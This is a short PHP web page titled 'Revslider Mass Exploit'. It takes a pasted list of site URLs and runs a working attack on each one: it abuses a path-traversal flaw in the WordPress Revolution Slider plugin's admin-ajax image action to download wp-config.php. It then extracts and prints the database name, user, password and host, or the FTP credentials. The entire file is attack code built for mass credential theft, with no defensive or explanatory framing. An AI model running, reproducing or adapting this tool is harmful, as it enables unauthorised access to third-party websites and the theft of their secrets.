<title>Revslider Mass Exploit</title>
<?php
include("../head.php");
?>

<?php
echo "<body>
<center>
<br>
<form method='post'>
<textarea class='form-control con7' name='sitessss' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='kntd' type='submit' name='comeon' value='get'>
</form>
";
function findit($mytext,$starttag,$endtag) {
 $posLeft  = stripos($mytext,$starttag)+strlen($starttag);
 $posRight = stripos($mytext,$endtag,$posLeft+1);
 return  substr($mytext,$posLeft,$posRight-$posLeft);
}
error_reporting(0);
set_time_limit(0);
$ya=$_POST['comeon'];
$co=$_POST['sitessss'];

if($ya){
 $e=explode("\r\n",$co);
 foreach($e as $bda){
	//echo '<br>'.$bda;
	$linkof='/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
	$dn=($bda).($linkof);
	$file=@file_get_contents($dn);
	if(eregi('DB_HOST',$file) and !eregi('FTP_USER',$file) ){
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
	echo "<center><font face='courier' color='#00BFFF' >".$bda."</font></center>";
	echo "<font face='courier' color=lime >DB name : </font>".findit($file,"DB_NAME', '","');")."<br>";
	echo "<font face='courier' color=lime >DB user : </font>".findit($file,"DB_USER', '","');")."<br>";
	echo "<font face='courier' color=lime >DB pass : </font>".findit($file,"DB_PASSWORD', '","');")."<br>";
	echo "<font face='courier' color=lime >DB host : </font>".findit($file,"DB_HOST', '","');")."<br>";
	}
	elseif(eregi('DB_HOST',$file) and eregi('FTP_USER',$file)){
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
	echo "<center><font face='courier' color='#00BFFF' >".$bda."</font></center>";
	echo "<font face='courier' color=lime >FTP user : </font>".findit($file,"FTP_USER','","');")."<br>";
	echo "<font face='courier' color=lime >FTP pass : </font>".findit($file,"FTP_PASS','","');")."<br>";
	echo "<font face='courier' color=lime >FTP host : </font>".findit($file,"FTP_HOST','","');")."<br>";
	}
	else{echo "<center><font face='courier' color='yellow' >".$bda." ----> not infected </font></center>";}
	echo'<center><font face="courier" color=red >----------------------------------------------</font></center>';
}
}
        ?>
<br><br>
